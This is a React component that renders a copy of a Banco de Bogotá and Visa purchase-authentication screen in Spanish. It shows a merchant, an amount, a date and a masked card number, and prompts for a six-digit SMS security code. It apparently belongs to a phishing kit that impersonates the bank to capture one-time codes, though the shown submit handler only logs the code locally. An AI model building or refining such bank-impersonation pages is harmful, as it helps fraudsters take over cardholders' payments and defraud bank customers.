import React, { useState } from 'react';
import './css/BogotaOTP.css';
import visaLogo from '../img/Visa_logo.webp';
import logoBogota from '../img/logo_bancobogota.png';

// User: Place your Banco de Bogotá logo in a folder here if available
// import bogotaLogo from './img/bogota-logo.png';

const BogotaOTP = () => {
  const [otp, setOtp] = useState('');

  const handleSubmit = (e) => {
    e.preventDefault();
    console.log('Bogotá OTP Submitted:', otp);
  };

  return (
    <div className="bogota-otp-container">
      <div className="bogota-otp-card">
        {/* Close Button */}
        <button
          className="bogota-otp-close"
          onClick={() => console.log('Cerrar')}
          title="Cerrar"
        >
          X
        </button>

        {/* Header with Logos */}
        <div className="bogota-otp-header">
          <div className="bogota-logo">
            <img src={logoBogota} alt="Banco de Bogotá" className="bogota-logo-img" />
            {/* <div style={{ display: 'flex', alignItems: 'center', gap: '5px' }}>
                <div style={{ width: '20px', height: '20px', backgroundColor: '#e30613', borderRadius: '50%' }}></div>
                <span style={{ fontSize: '14px', fontWeight: 'bold', color: '#003da5' }}>Banco de Bogotá</span>
            </div> */}
          </div>
          <div className="visa-logo">
            <img src={visaLogo} alt="VISA" className="visa-logo-img" />
          </div>
        </div>

        {/* Body Content */}
        <div className="bogota-otp-body">
          <h2 className="bogota-otp-title">Autenticación de compra</h2>

          <div className="bogota-otp-description">
            <p>Hemos enviado un código de verificación por mensaje de texto al número celular registrado en Banco de Bogotá.</p>
            <p>
              Para autorizar un pago a <strong>Rush Street</strong> por valor de <strong>$0,00 COP</strong> el <strong>22/02/2025</strong> con tu tarjeta <strong>************8308</strong>.
            </p>
          </div>

          <form onSubmit={handleSubmit} className="bogota-otp-form">
            <label className="bogota-otp-label">Código de Seguridad</label>
            <input
              type="text"
              className="bogota-otp-input"
              maxLength={6}
              value={otp}
              onChange={(e) => setOtp(e.target.value.replace(/\D/g, ''))}
              placeholder=""
              autoFocus
            />

            <button type="submit" className="bogota-otp-submit">
              ACTIVAR
            </button>
          </form>

          {/* Links */}
          <div style={{ textAlign: 'center' }}>
            <button
              className="bogota-otp-resend"
              onClick={() => console.log('Reenviar código')}
            >
              REENVIAR CÓDIGO
            </button>
          </div>
        </div>
      </div>
    </div>
  );
};

export default BogotaOTP;
